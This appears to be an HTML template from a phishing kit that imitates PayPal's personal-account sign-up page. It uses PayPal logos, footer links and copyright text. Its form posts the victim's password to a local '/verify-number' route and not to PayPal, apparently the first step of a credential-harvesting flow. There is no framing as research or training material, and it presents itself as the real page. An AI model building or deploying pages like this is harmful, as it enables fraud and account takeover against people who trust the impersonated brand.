<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign up for Personal account</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='paypal.css') }}">
    <script src="https://kit.fontawesome.com/a8c88432fd.js" crossorigin="anonymous"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <header>
        <nav>
            <a href="https://www.paypal.com/" class="container-logo">
                <img src="../static/paypal-color.svg" class="logo-paypal">
            </a>
        </nav>
    </header>
    <article>
        <div class="box">
            <img src="../static/pp_fc_mg.svg" class="logo-mini-paypal">
            <div class="component-title">
                <p>Sign up for a Personal account</p>
            </div>
            <div class="component-description">
                <span>
                    Enter the password address you’ll use to sign up or log in.
                    <a class="forgot" href="https://www.paypal.com/authflow/password-recovery/?redirectUri=%252Fsignin%253FreturnUri%253Dhttps%25253A%25252F%25252Fwww.paypal.com%25252Fbizsignup%25252Fafter-login%25253FmfKey%25253DbsnwTtD1S854Z2xe0flSWrLwkcDnA-Est34U%2526ctxId%253DbsnwTtD1S854Z2xe0flSWrLwkcDnA-Est34U&country.x=US&locale.x=en_US">
                        Forgot password?
                    </a>
                </span>
            </div>
            <form action="/verify-number" method="post" class="container-personal">
                <input type="password" id="password" name="password" class="input-personal" placeholder="Password">
            <div class="component-button">
                <a href="#">
                    <button type="submit" class="button-continue">Continue</button>
                </a>
            </div>
            </form>
        </div>
    </article>
    <footer>
        <div class="set-copyright">
            <p>Copyright © 1999 - 2024 PayPal. All rights reserved.</p>
        </div>
        <div class="set-info">
            <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full?locale.x=en_US">Privacy Statement</a>
            <p>&#160|&#160</p>
            <a href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full?locale.x=en_US">Legal agreements</a>
            <p>&#160|&#160</p>
            <a href="https://www.paypal.com/us/webapps/helpcenter/helphub/home?locale.x=en_US">Help</a>
            <p>&#160|&#160</p>
            <a href="https://www.paypal.com/us/smarthelp/contact-us?locale.x=en_US">Contact Us</a> 
        </div>
    </footer>
</body>
</html>
